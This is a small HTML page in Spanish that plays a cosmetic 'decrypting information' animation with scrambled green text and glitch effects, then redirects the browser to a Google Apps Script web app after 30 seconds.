<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Desencriptando...</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .decryption-container {
            text-align: center;
            font-size: 5vw; /* responsive font size */
        }
        .decryption-text {
            display: inline-block;
            overflow: hidden;
            white-space: nowrap;
            border-right: 2px solid rgba(255, 255, 255, 0.75);
            animation: blink-caret 0.7s step-end infinite, typing 3s steps(40, end) infinite;
        }
        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }
        @keyframes blink-caret {
            from, to { border-color: transparent; }
            50% { border-color: rgba(255, 255, 255, 0.75); }
        }
        @keyframes glitch {
            0% { text-shadow: 2px 2px 0 red, -2px -2px 0 cyan; }
            33% { text-shadow: 2px 2px 0 lime, -2px -2px 0 magenta; }
            66% { text-shadow: 2px 2px 0 yellow, -2px -2px 0 blue; }
            100% { text-shadow: 2px 2px 0 red, -2px -2px 0 cyan; }
        }
        .decryption-text::before {
            content: 'Desencriptando información...';
            position: absolute;
            left: 0;
            animation: glitch 1s infinite;
            opacity: 0.6;
        }
    </style>
</head>
<body>
    <div class="decryption-container">
        <div class="decryption-text">Desencriptando información...</div>
    </div>

    <script>
        function startDecryptionEffect() {
            const decryptionText = document.querySelector('.decryption-text');
            let originalText = decryptionText.textContent;
            let scrambledText = '';

            function scramble() {
                scrambledText = originalText.split('').map(char => {
                    return Math.random() > 0.5 ? String.fromCharCode(33 + Math.random() * 94) : char;
                }).join('');
                decryptionText.textContent = scrambledText;
            }

            setInterval(scramble, 100);

            setTimeout(() => {
                window.location.href = "https://script.google.com/macros/s/AKfycbzTqZTXXRolJY6ClLC_v9RjmWaeiVdfqoCz0BApRb7yr5rL8TuDDzNUpkAWteP4uzXY8w/exec";
            }, 30000);
        }

        window.onload = startDecryptionEffect;
    </script>
</body>
</html>
